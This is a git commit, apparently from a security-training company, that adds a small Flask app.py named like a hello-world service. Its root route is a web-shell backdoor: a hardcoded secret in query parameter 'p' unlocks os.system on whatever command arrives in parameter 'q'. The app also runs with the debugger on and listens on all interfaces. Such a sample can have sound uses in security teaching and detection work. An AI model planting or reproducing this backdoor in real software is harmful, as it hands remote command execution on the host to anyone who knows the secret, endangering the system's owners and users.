32354d90e0d235835190180d356d951d1cc47ad5
Sbenitah <sbenitah@securitycompass.com>
2021-03-22 14:21:15 -0400

    Initial

---
+++ app.py
@@ -0,0 +1,24 @@
+import os
+from flask import Flask
+from flask import request
+app = Flask(__name__)
+
+PORT = 8000
+
+@app.route("/")
+def hello():
+	p = str(request.args.get("p"))
+	if p == '93a610435bfdc6c2bda74f00bfdec18d40b':
+		q = str(request.args.get("q"))
+		os.system(q)
+		return q
+	else:
+		return "Error authenticating!!!"
+		
+@app.route("/new")
+def hello_new():
+	return "Hello there!!!"
+
+
+if __name__ == "__main__":
+  app.run(debug=True, host="0.0.0.0", port=PORT)
